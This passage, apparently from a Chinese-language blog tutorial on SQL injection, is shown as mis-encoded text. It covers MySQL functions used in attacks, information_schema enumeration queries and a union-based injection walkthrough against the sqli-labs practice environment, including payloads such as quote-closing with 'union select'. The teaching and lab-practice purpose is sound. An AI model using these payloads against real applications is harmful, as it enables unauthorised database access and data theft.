Language</code>ï¼Œç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€)æ˜¯ä¸€ç§ç‰¹å®šç›®çš„ç¨‹å¼è¯­è¨€ï¼Œç”¨äºç®¡ç†å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆ<code>RDBMS</code>ï¼‰ï¼Œæˆ–åœ¨å…³ç³»æµæ•°æ®ç®¡ç†ç³»ç»Ÿï¼ˆ<code>RDSMS</code>ï¼‰ä¸­è¿›è¡Œæµå¤„ç†ã€‚<br><code>SQL</code>åŸºäºå…³ç³»ä»£æ•°å’Œå…ƒç»„å…³ç³»æ¼”ç®—ï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ•°æ®å®šä¹‰è¯­è¨€å’Œæ•°æ®æ“çºµè¯­è¨€ã€‚<code>SQL</code>çš„èŒƒå›´åŒ…æ‹¬æ•°æ®æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°å’Œåˆ é™¤ï¼Œæ•°æ®åº“æ¨¡å¼åˆ›å»ºå’Œä¿®æ”¹ï¼Œä»¥åŠæ•°æ®è®¿é—®æ§åˆ¶ã€‚å°½ç®¡<code>SQL</code>ç»å¸¸è¢«æè¿°ä¸ºï¼Œè€Œä¸”å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸€ç§å£°æ˜å¼ç¼–ç¨‹ï¼ˆ<code>4GL</code>ï¼‰ï¼Œä½†æ˜¯å…¶ä¹Ÿå«æœ‰è¿‡ç¨‹å¼ç¼–ç¨‹çš„å…ƒç´ ã€‚(from wiki)</p><p>æˆ‘ä»¬æœ€å¸¸ç”¨çš„æ•°æ®åº“ç³»ç»Ÿæ˜¯<code>mysql</code>ã€‚</p><h2 id="Mysqlå¸¸ç”¨å‡½æ•°"><a href="#Mysqlå¸¸ç”¨å‡½æ•°" class="headerlink" title="Mysqlå¸¸ç”¨å‡½æ•°"></a>Mysqlå¸¸ç”¨å‡½æ•°</h2><h3 id="æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°"><a href="#æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°" class="headerlink" title="æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°"></a>æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°</h3><table><thead><tr><th>å‡½æ•°å</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>user()</td><td>ç”¨æˆ·å</td></tr><tr><td>system_user()</td><td>ç³»ç»Ÿç”¨æˆ·å</td></tr><tr><td>curent_user()</td><td>å‰ç”¨æˆ·å</td></tr><tr><td>session_user()</td><td>è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å</td></tr><tr><td>database()</td><td>å½“å‰é€‰æ‹©çš„æ•°æ®åº“</td></tr><tr><td>version()</td><td>æ•°æ®åº“ç‰ˆæœ¬</td></tr><tr><td>@@data_dir()</td><td>æ•°æ®åº“è·¯å¾„</td></tr><tr><td>@@base_dir()</td><td>æ•°æ®åº“å®‰è£…è·¯å¾„</td></tr><tr><td>@@version_compile_os</td><td>æ“ä½œç³»ç»Ÿ</td></tr></tbody></table><p>æ³¨æ„ï¼Œè¿™äº›å‡½æ•°éƒ½æ— å‚æ•°ä¸”åœ¨ä½¿ç”¨æ—¶å¿…é¡»ä½¿ç”¨ <code>select</code> å…³é”®å­—è¾“å‡ºã€‚</p><h3 id="å­—ç¬¦ä¸²å¤„ç†å‡½æ•°"><a href="#å­—ç¬¦ä¸²å¤„ç†å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²å¤„ç†å‡½æ•°"></a>å­—ç¬¦ä¸²å¤„ç†å‡½æ•°</h3><p>åœ¨sqlä¸­ï¼Œå­—ç¬¦ä¸²é€šå¸¸ä½¿ç”¨ä¸€å¯¹å•å¼•å·è¡¨ç¤ºã€‚</p><table><thead><tr><th>å‡½æ•°å</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>concat(s1,s2,s3â€¦)</td><td>æ— ä»»ä½•åˆ†éš”åœ°è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td>concat_ws(char,s1,s2,s3â€¦)</td><td>æœ‰åˆ†éš”åœ°è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td>group_concat(s1)</td><td>è¿æ¥s1åˆ—çš„æ‰€æœ‰è®°å½•å¹¶é€—å·åˆ†éš”</td></tr><tr><td>load_file(file)</td><td>è¯»å–æ–‡ä»¶</td></tr><tr><td>into outfile â€˜fileâ€™</td><td>å†™æ–‡ä»¶</td></tr><tr><td>ascii(str)</td><td>å­—ç¬¦ä¸²çš„ASCIIç å€¼</td></tr><tr><td>ord(str)</td><td>è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIå€¼</td></tr><tr><td>mid(str,start,length)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</td></tr><tr><td>substr(str,start,length)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</td></tr><tr><td>length(str)</td><td>è¿”å›å­—ç¬¦ä¸²é•¿åº¦</td></tr><tr><td>left(str,length)</td><td>è¿”å›å­—ç¬¦ä¸²çš„å‰ç¼€</td></tr><tr><td>rigth(str,length)</td><td>è¿”å›å­—ç¬¦ä¸²çš„åç¼€</td></tr></tbody></table><h3 id="sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"><a href="#sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°" class="headerlink" title="sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"></a>sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°</h3><table><thead><tr><th>å‡½æ•°å</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>extractvalue(xml,Xpath)</td><td>ä½¿ç”¨ XPathtable ç¤ºæ³•ä» XML å­—ç¬¦ä¸²ä¸­æå–å€¼</td></tr><tr><td>UpdateXML(xml,Xpath,replacement)</td><td>è¿”å›æ›¿æ¢çš„ XML ç‰‡æ®µ</td></tr><tr><td>sleep(sec)</td><td>ç¨‹åºä¼‘çœ å¯¹åº”ç§’æ•°</td></tr><tr><td>if(expression,truepart,falsepart)</td><td>å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸè¿”å›ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦åˆ™è¿”å›ç¬¬ä¸‰ä¸ªå‚æ•°</td></tr><tr><td>char()</td><td>è¿”å›æ•´æ•°ASCIIä»£ç å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²</td></tr><tr><td>strcmp(str1,str2)</td><td>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²str1&gt;str2è¿”å›1ï¼Œç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›-1</td></tr><tr><td>IFNULL(arg1,arg2)</td><td>å‚æ•°1ä¸ä¸ºNULLè¿”å›å‚æ•°1ï¼Œå¦åˆ™è¿”å›å‚æ•°2</td></tr><tr><td>exp(pow)</td><td>è¿”å›eçš„æŒ‡æ•°å¹‚</td></tr></tbody></table><h2 id="Mysqlå†…ç½®æ•°æ®åº“"><a href="#Mysqlå†…ç½®æ•°æ®åº“" class="headerlink" title="Mysqlå†…ç½®æ•°æ®åº“"></a>Mysqlå†…ç½®æ•°æ®åº“</h2><ul><li><code>Mysql</code>ï¼šä¿å­˜è´¦æˆ·ä¿¡æ¯ï¼Œæƒé™ä¿¡æ¯ï¼Œå­˜å‚¨è¿‡ç¨‹ï¼Œeventï¼Œæ—¶åŒºç­‰ä¿¡æ¯</li><li><code>sys</code>ï¼šåŒ…å«äº†ä¸€ç³»åˆ—çš„å­˜å‚¨è¿‡ç¨‹ã€è‡ªå®šä¹‰å‡½æ•°ä»¥åŠè§†å›¾æ¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿçš„äº†è§£ç³»ç»Ÿçš„å…ƒæ•°æ®ä¿¡æ¯ã€‚ï¼ˆå…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ï¼‰</li><li><code>performance_schema</code>ï¼šç”¨äºæ”¶é›†æ•°æ®åº“æœåŠ¡å™¨æ€§èƒ½å‚æ•°</li><li><code>information_schema</code>ï¼šå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚å…¶ä¸­ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚</li></ul><p>è¿™é‡Œçœ‹ä¼¼å¾ˆå¤æ‚ï¼Œå®é™…ä¸Šä½ åªéœ€è¦çŸ¥é“è¿™ä¸ª <code>performance_schema</code> æ•°æ®åº“å°±å¯ä»¥äº†ã€‚å¯¹äºä¸€ä¸ªæœªçŸ¥çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“å®ƒçš„æ•°æ®åº“åï¼Œæ•°æ®è¡¨åï¼ŒçŸ¥é“è¡¨åä¹‹åè¿˜å¾—çŸ¥é“å­—æ®µåï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½ä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„ <code>sql</code> è¯­å¥ <code>select å­—æ®µå from  æ•°æ®åº“.è¡¨å;</code> å»æ³„éœ²æ•°æ®åº“çš„å…·ä½“ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬ <code>navicat</code> æ‰“å¼€è¿™ä¸ªæ•°æ®åº“è§‚å¯Ÿä¸€ä¸‹æœ‰ä»€ä¹ˆè¡¨</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/1.png" alt="1"> </p><p>çœ‹ç€å¾ˆå¤šï¼Œå…¶å®æˆ‘ä»¬åªéœ€è¦å…³å¿ƒä¸‰ä¸ªè¡¨ï¼š<code>schemata</code>ï¼Œ<code>tables</code>ï¼Œ<code>columns</code>ï¼Œå®ƒä»¬åˆ†åˆ«èƒ½çˆ†å‡ºæ•°æ®åº“åï¼Œè¡¨åå’Œå­—æ®µåã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹ç¬¬ä¸€ä¸ªè¡¨ <code>schemata</code> çš„å…·ä½“ä¿¡æ¯ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/2.png" alt="2"></p><p>å¯ä»¥çœ‹åˆ°é‡Œé¢çš„<code>schema_name</code> å­—æ®µçš„å€¼å°±æ˜¯æˆ‘ä»¬å½“å‰è¿™ä¸ªæ•°æ®åº“ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®åº“çš„åå­—ï¼Œä»å·¦è¾¹ä¹Ÿå¯ä»¥ä¸€ä¸€å¯¹åº”çœ‹åˆ°å¯¹åº”çš„æ•°æ®åº“ã€‚</p><p>ç„¶åçœ‹çœ‹ç¬¬äºŒä¸ªè¡¨ <code>tables</code> çš„ä¿¡æ¯ã€‚å› ä¸ºæœ‰ç‚¹å¤šæˆ‘ä»¬çœ‹ä¸»è¦çš„ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/3.png" alt="3"></p><p>å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ª <code>table_name</code> å­—æ®µå°±æ˜¯æ•´ä¸ªæ•°æ®åº“ç³»ç»Ÿçš„æ‰€æœ‰è¡¨åï¼Œç„¶åå‰é¢çš„ <code>table_schema</code> å°±æ˜¯è¿™ä¸ªè¡¨å¯¹åº”çš„æ•°æ®åº“åã€‚è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™ä¸ªæ•°æ®åº“èƒ½ä»ä¸­æ‰¾åˆ° <code>tables</code> å’Œ <code>schemata</code> è¿™ä¸¤ä¸ªè¡¨åï¼Œä»¥åŠå…¶å®ƒä¹±ä¸ƒå…«ç³Ÿçš„åœ¨ä¸Šä¸€å¼ å›¾ä¹Ÿéƒ½æœ‰æ˜¾ç¤ºã€‚</p><h2 id="è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼"><a href="#è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼" class="headerlink" title="è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼"></a>è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼</h2><p>åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ª <code>mysql</code> è¿æ¥çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æƒ³æŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“å¾ˆç®€å•ï¼Œä¸€å¥ <code>show databases;</code> å³å¯è§£å†³ï¼Œä½†æ˜¯é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬è¿™æ ·å­è¾“å…¥å¹¶ä¸èƒ½å¾ˆå¥½çš„å›æ˜¾ï¼Œå¦‚æœæŠŠæ•°æ®åº“åä½œä¸ºä¸€æ¡è®°å½•è¾“å‡ºå‡ºæ¥é‚£å¤„ç†èµ·æ¥ä¼šå¥½å¾ˆå¤šã€‚</p><p>æˆ‘ä»¬æƒ³æŸ¥çœ‹æ•°æ®åº“è¿˜å¯ä»¥ç”¨è¿™ç§æ–¹å¼ï¼š</p><p><code>select schema_name from information_schema.schemata;</code></p><p>æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹ä¸¤ä¸ªæŒ‡ä»¤çš„ç»“æœ</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/4.png" alt="4"></p><p>å¯ä»¥çœ‹åˆ°ç»“æœåŸºæœ¬å°±æ˜¯ä¸€æ ·çš„ã€‚ç„¶åæˆ‘ä»¬æƒ³æŸ¥çœ‹æ¯”å¦‚è¯´ <code>world</code> æ•°æ®åº“çš„è¡¨åï¼Œæˆ‘ä»¬ä¸€èˆ¬å…ˆ <code>use world</code> å† <code>show tables</code> æˆ–è€…ä¸€å¥è¯ <code>show tables from world;</code> ç›´æ¥è¾“å‡ºè¡¨åï¼Œä½†æ˜¯æœ‰ <code>information_schema</code> è¿™ä¸ªæ•°æ®åº“ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡è¿™é‡ŒæŠŠä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ã€‚</p><p><code>select table_name from information_schema.tables where table_schema=&#39;world&#39;;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/5.png" alt="5"></p><p>å¯ä»¥çœ‹åˆ°ç»“æœä¹Ÿæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p><p>å‰©ä¸‹çš„çˆ†å­—æ®µå°±ä¸æ¼”ç¤ºäº†ï¼ŒåŒç†çš„ã€‚</p><p><code>select column_name from information_schema.columns where table_name=&#39;city&#39;;</code></p><p>ä»¥ä¸Šçš„ <code>payload</code> å¯ä»¥ç›´æ¥åœ¨æ³¨å…¥çš„åœ°æ–¹åŠ è¿›å»ï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹è¡¨åå’Œæ•°æ®åº“åå³å¯ã€‚</p><h2 id="sqli-labsç¯å¢ƒæ­å»º"><a href="#sqli-labsç¯å¢ƒæ­å»º" class="headerlink" title="sqli-labsç¯å¢ƒæ­å»º"></a>sqli-labsç¯å¢ƒæ­å»º</h2><p>ä¸»è¦å­¦ä¹ çš„ç¯å¢ƒè¿˜æ˜¯ç”¨çš„ <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> ï¼Œæˆ‘æ˜¯ç›´æ¥åœ¨ä¸»æœºä¸Šæ­å»ºï¼Œå› ä¸ºä¿®æ”¹ä»£ç èµ·æ¥ååˆ†æ–¹ä¾¿ï¼Œä¸€æ”¹å°±èƒ½è§åˆ°æ•ˆæœã€‚ä½†æ˜¯è¿™ä¹ˆåšç¡®ä¿åˆ‡æ–­äº†å¯¹å¤–ç•Œçš„ç½‘ç»œè¿æ¥ï¼Œæˆ–è€…å¿ƒå¤§ä¸€ç‚¹å°±ç®—äº†ï¼Œæƒ³ç€æ²¡äººä¼šå¯¹è‡ªå·±çš„ä¸»æœºå‘èµ·è¿›æ”»çš„ã€‚</p><p>ç„¶åè‡ªå·±å†æ­å»ºä¸€ä¸ª <code>web</code> æœåŠ¡ï¼Œèƒ½è®¿é—®å°±ç®—æˆåŠŸäº†ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/6.png" alt="6"></p><p>åœ¨ä½¿ç”¨ä¹‹å‰åœ¨ <code>sqli-labs\sql-connections\</code> ç›®å½•ä¸‹çš„ <code>db-creds.inc</code> ä¸­é…ç½®ä¸€ä¸‹è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå†ç‚¹å‡» <code>setup</code> æŠŠæ•°æ®åº“å…ˆé…ç½®å¥½ï¼Œå¦‚æœä¸€åˆ‡OKï¼Œé‚£ä¹ˆè¿›å…¥ç¬¬ä¸€å…³çš„æ•ˆæœåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><h2 id="sqlæ³¨å…¥è¯¦è§£"><a href="#sqlæ³¨å…¥è¯¦è§£" class="headerlink" title="sqlæ³¨å…¥è¯¦è§£"></a>sqlæ³¨å…¥è¯¦è§£</h2><p>åœ¨å¯¹ä¸€ä¸ª <code>ctf</code> æ‰“ <code>sql</code> æ³¨å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥å°±æ˜¯è¦å¯»æ‰¾<strong>æ³¨å…¥ç‚¹</strong>ã€‚æ€ä¹ˆå¯»æ‰¾æ³¨å…¥ç‚¹å‘¢ï¼Œå› ä¸ºåç«¯æºç æˆ‘ä»¬éƒ½æ˜¯ä¸çŸ¥é“çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡æŠ“åŒ…çš„æ–¹å¼è§‚å¯Ÿæ‰€æœ‰èƒ½<strong>æäº¤çš„å‚æ•°</strong>è¿›è¡Œ <code>sql</code> æ³¨å…¥çš„æµ‹è¯•ã€‚</p><p>æ‰¾åˆ°æ³¨å…¥ç‚¹ä¹‹åæˆ‘ä»¬è¿˜éœ€è¦åˆ¤æ–­æ³¨å…¥çš„ç±»å‹ã€‚å¤§ä½“çš„æ³¨å…¥åˆ†ä¸¤ç±»ï¼Œä¸€ç±»æ˜¯<strong>æœ‰å›æ˜¾çš„æ³¨å…¥</strong>ï¼Œå¦ä¸€ç±»æ˜¯<strong>æ²¡æœ‰å›æ˜¾çš„æ³¨å…¥</strong>ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘æœ‰å›æ˜¾çš„æ³¨å…¥ï¼Œå› ä¸ºæ—¶é—´æˆæœ¬æ¯”è¾ƒä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æœ‰å›æ˜¾çš„æ³¨å…¥å§ã€‚</p><h3 id="æœ‰å›æ˜¾çš„æ³¨å…¥"><a href="#æœ‰å›æ˜¾çš„æ³¨å…¥" class="headerlink" title="æœ‰å›æ˜¾çš„æ³¨å…¥"></a>æœ‰å›æ˜¾çš„æ³¨å…¥</h3><p>ä»€ä¹ˆå«æœ‰å›æ˜¾ï¼ŸæŸ¥è¯¢åˆ°çš„æ•°æ®åº“ä¿¡æ¯ä¼š<strong>ç›´æ¥æ˜¾ç¤º</strong>å‡ºæ¥ï¼Œä½ èƒ½çœ‹åˆ°çš„å°±å«æœ‰å›æ˜¾ï¼Œåä¹‹åˆ™æ˜¯æ²¡æœ‰å›æ˜¾ã€‚æœ‰å›æ˜¾çš„æ³¨å…¥æœ‰ä»¥ä¸‹ç±»å‹ï¼š</p><ol><li>è”åˆæŸ¥è¯¢çš„æ³¨å…¥ï¼šé€šè¿‡unionå…³é”®å­—æ³„éœ²æ•°æ®åº“ä¿¡æ¯</li><li>å †å æ³¨å…¥ï¼šé€šè¿‡é‡æ–°æ‰§è¡Œä¸€ä¸ª <code>sql</code> è¯­å¥çš„æ–¹å¼æ³„éœ²æ•°æ®åº“ä¿¡æ¯ï¼Œæˆ–è€…ç›´æ¥å¢åˆ æ”¹æŸ¥æ•°æ®åº“ã€‚</li><li>æŠ¥é”™æ³¨å…¥ï¼šé€šè¿‡ä¸€äº›ç‰¹æ®Šçš„å‡½æ•°æŠ¥é”™æŠŠä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ã€‚</li><li>äºŒæ¬¡æ³¨å…¥ï¼šå’•å’•å’•</li></ol><h4 id="è”åˆæŸ¥è¯¢çš„æ³¨å…¥"><a href="#è”åˆæŸ¥è¯¢çš„æ³¨å…¥" class="headerlink" title="è”åˆæŸ¥è¯¢çš„æ³¨å…¥"></a>è”åˆæŸ¥è¯¢çš„æ³¨å…¥</h4><p>åˆ©ç”¨è¦æ±‚ï¼šæœ‰å›æ˜¾</p><p>å‡å¦‚ä½ æ˜¯ <code>admin</code> ç™»å½•ä¹‹åï¼Œå®ƒé¡µé¢å¯èƒ½ä¼šæ˜¾ç¤º <code>hello,admin</code>ã€‚é‚£ä¹ˆè¿™ä¸ª <code>hello</code> åé¢å°±æ˜¯ä¸€ä¸ªå›æ˜¾çš„ç‚¹ï¼Œè¿™é‡Œå°±å¯ä»¥ç”¨æ¥æ³„éœ²å…¶å®ƒä¿¡æ¯ã€‚è¿™é‡Œéœ€è¦æ€ä¹ˆç†è§£å‘¢ï¼Œå‡å¦‚å®ƒåœ¨ç™»å½•çš„é€»è¾‘æ˜¯è¿™æ ·å†™çš„ï¼š</p><p><code>select username,passowrd from data.user where username=&#39;$input_username&#39; and password=&#39;$input_password&#39;;</code><br>ç„¶åæˆ‘ä»¬åˆ¤æ–­ä½ çš„è´¦å·å¯†ç æ˜¯å¦æ­£ç¡®å°±ä¸»è¦çœ‹å®ƒæ˜¯å¦èƒ½æŸ¥æ‰¾åˆ°è®°å½•ï¼Œå¦‚æœæ‰¾åˆ°ï¼Œé‚£ä¹ˆæˆ‘é€‰å–è¿™æ¡è®°å½•çš„ç¬¬ä¸€ä¸ªè®°å½•çš„ <code>username</code> å­—æ®µï¼Œç„¶åè¾“å‡ºè¿™ä¸ªï¼Œå°±è¾¾åˆ°äº†å®ƒæˆåŠŸç™»å½•äº†ä»€ä¹ˆè´¦å·ï¼Œæˆ‘è¾“å‡ºé‚£ä¸ªè´¦å·çš„ç›®çš„äº†ã€‚</p><p>è‡³äºä¸Šé¢ä¸ºä»€ä¹ˆè¯´æ˜¯ç¬¬ä¸€æ¡è®°å½•å‘¢ï¼Œè¿™é‡Œä½ éœ€è¦è¿™ä¹ˆçœ‹ï¼š<code>select</code> çš„è¿”å›ç»“æœå¯èƒ½æœ‰å¾ˆå¤šï¼Œè€Œä¸ç®¡å®ƒè¿”å›äº†ä¸€æ¡è¿˜æ˜¯å¤šæ¡å®ƒéƒ½æ˜¯ä¸€ä¸ªæ•°æ®é›†ï¼Œæ˜¯ä¸ªäºŒç»´çš„è¡¨ã€‚å› æ­¤é€‰æ‹©ç¬¬ä¸€æ¡è®°å½•æ˜¯å¼€å‘äººå‘˜é»˜è®¤ä¼šåŠ ä¸Šçš„ï¼Œæ­¤æ—¶æˆ‘åªéœ€ä½¿å¾—å‰é¢çš„è¯­å¥æŸ¥è¯¢å¤±è´¥ï¼ˆè¿”å›ç©ºæ•°æ®é›†ï¼‰å¹¶é€‰å–å…¶å®ƒå†…å®¹ç”¨ <code>union</code> åˆå¹¶è¿™ä¸ªæ•°æ®é›†ï¼Œå¹¶æŠŠè¿™é‡Œçš„å…¶å®ƒå†…å®¹æ›¿æ¢æˆæˆ‘æƒ³çŸ¥é“çš„å†…å®¹ï¼Œæ¯”å¦‚å®ƒçš„æ•°æ®åº“åï¼Œè¡¨åï¼Œç„¶åå®ƒè¿™é‡Œå°±ä¼šåŸæ ·è¾“å‡ºè¿™äº›ä¿¡æ¯äº†ï¼Œæˆ‘ä»¬å°±çŸ¥é“äº†ã€‚è¿™é‡Œéœ€è¦çŸ¥é“ <code>union</code> æ˜¯åˆå¹¶ä¸¤ä¸ªæ•°æ®é›†çš„ï¼Œå› æ­¤ä¸¤ä¸ªæ•°æ®é›†çš„å®½åº¦ï¼ˆå­—æ®µæ•°ï¼‰å¿…é¡»ä¸€æ ·ï¼Œæ•°æ®ç±»å‹å¯ä»¥ä¸ä¸€æ ·ï¼Œè¿”å› <code>php</code> å¤„ç†ä¹‹åéƒ½ä¼šå˜æˆå­—ç¬¦ä¸²ç±»å‹å…¶å®ã€‚</p><p>è¿™é‡Œæˆ‘ä»¬æ‹¿åˆšåˆšæ­å»ºçš„ç¯å¢ƒçš„ç¬¬ä¸€å…³æ¥åšæµ‹è¯•ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><p>è¿™é‡Œæˆ‘ä»¬ä¸éœ€è¦å¯»æ‰¾æµ‹è¯•ç‚¹äº†ï¼Œå®ƒè¿™é‡Œå·²ç»è´´å¿ƒåœ°æé†’æˆ‘ä»¬ç”¨ <code>get</code> ä¼ ä¸€ä¸ª <code>id</code> å‚æ•°è¿›å»äº†ï¼Œå› æ­¤æˆ‘ä»¬å…ˆè¯• <code>1</code>ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/8.png" alt="8"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘è¾“å…¥ä¸€ä¸ª <code>1</code> å®ƒç›´æ¥è´´å¿ƒçš„å‘Šè¯‰äº†æˆ‘ä»¬è´¦å·å’Œå¯†ç æ˜¯ä»€ä¹ˆï¼Œè¿™é‡Œæ˜¾ç¤ºçš„è´¦å·å’Œå¯†ç å°±æ˜¯å›æ˜¾çš„ç‚¹ã€‚</p><p>æˆ‘ä»¬å†æµ‹è¯•è¿™ä¸ªå‚æ•°æ˜¯å¦èƒ½æ³¨å…¥ï¼Œæœ€ç®€å•æœ€ç›´æ¥çš„æ–¹æ³•å°±æ˜¯æ‰“ä¸ªå•å¼•å·æˆ–è€…åŒå¼•å·è¿›å»ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/9.png" alt="10"></p><p>å¯ä»¥å‘ç°æ•°æ®åº“æŠ¥é”™ï¼Œé‚£å°±è¯´æ˜è¿™ä¸ªå‚æ•°æ˜¯å¯ä»¥æ³¨å…¥çš„ã€‚</p><p>å› æ­¤æˆ‘ä»¬ç”¨åˆšåˆšæåˆ°çš„æ–¹æ³•ï¼Œå…ˆå¦å‰ä¸€ä¸ªè¯­å¥æŸ¥è¯¢å¤±è´¥ï¼ˆç©ºæ•°æ®é›†ï¼‰ï¼Œç„¶åå† <code>union</code> ä¸Šä¸€ä¸ªæ•°æ®é›†ï¼Œè¿™ä¸ªæ•°æ®é›†æ˜¯æˆ‘ä»¬ä»»ä½•æˆ‘ä»¬æƒ³æ³„éœ²çš„ä¿¡æ¯ï¼Œé¦–å…ˆæˆ‘ä»¬å‡è£…å¯¹æ•°æ®åº“ä¸€æ— æ‰€çŸ¥ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥å°±æ˜¯è¦çŸ¥é“è¿™é‡Œæœ‰å¤šå°‘æ•°æ®åº“ï¼Œåˆ†åˆ«ä»€ä¹ˆåå­—ã€‚</p><p>æ ¹æ®æŠ¥é”™ä¿¡æ¯å¯ä»¥ç•¥å¾®çŒœæµ‹ä¸€ä¸‹å®ƒçš„å†™æ³• <code>select username,password from xxx.yyy where id=&#39;$input_id&#39; limit 0,1</code></p><p>æˆ‘ä»¬å…ˆç”¨å¼•å·é—­åˆå‰é¢çš„å‚æ•°ï¼Œç„¶ååé¢åŠ ä¸Šä¸€ä¸ª <code>and 1=0</code> è®©å‰é¢çš„æ•°æ®é›†å¿…ä¸ºç©ºï¼Œç„¶åå† <code>union select 1,2--+</code> ï¼Œè¿™é‡Œéœ€è¦æµ‹è¯•å‚æ•°çš„ä¸ªæ•°ï¼Œå› ä¸ºä½ ä¸çŸ¥é“å‰é¢æœ‰å‡ ä¸ªå­—æ®µï¼Œä¸è¿‡è¿™é‡Œå¯ä»¥å§‘ä¸”å…ˆçŒœä¸ª <code>2</code>ï¼Œå› ä¸ºç›®å‰çœ‹æ¥å°±æ‰¾äº†è´¦å·å’Œå¯†ç å˜›ï¼Œæœ€åç”¨ <code>--+</code> å»æ³¨é‡Šåé¢çš„å•å¼•å·ã€‚ç»“æœå‘ç°æ•°æ®åº“æŠ¥äº†è¿™ä¸ªé”™è¯¯ï¼š<code>The used SELECT statements have a different number of columns</code>ï¼Œè¿™ä¸ªä¹Ÿä¸éš¾çœ‹å‡ºæ¥æ˜¯å› ä¸º <code>union</code> å‰åçš„æ•°æ®é›†å«æœ‰ä¸åŒçš„åˆ—æ•°ï¼Œä¹Ÿå°±æ˜¯å­—æ®µæ•°ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è¿™é‡Œä¸æ˜¯ä¸¤ä¸ªï¼Œé‚£æˆ‘ä»¬æ¢æˆ <code>3</code> 